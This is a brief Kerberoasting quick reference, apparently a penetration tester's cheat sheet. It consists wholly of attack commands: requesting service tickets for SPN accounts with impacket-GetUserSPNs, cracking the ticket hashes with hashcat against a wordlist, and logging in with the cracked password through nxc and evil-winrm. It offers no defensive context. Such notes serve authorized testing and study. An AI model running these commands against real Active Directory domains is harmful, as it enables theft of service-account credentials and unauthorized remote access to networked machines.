KERBEROASTING — QUICK REF

Requires: valid low-priv domain credentials

1.  Find SPNs + request tickets (one command):
    impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain>/<user>:<pass> -outputfile kerberoasting.hashes

2.  Crack — RC4 (mode 13100, $krb5tgs$23$...):
    hashcat -m 13100 kerberoasting.hashes /usr/share/wordlists/rockyou.txt

    Crack — AES256 (mode 19700, $krb5tgs$18$...):
    hashcat -m 19700 kerberoasting.hashes /usr/share/wordlists/rockyou.txt

3.  Use cracked password:
    nxc smb <ip> -u <user> -p <cracked-pass>
    evil-winrm -i <ip> -u <user> -p <cracked-pass>
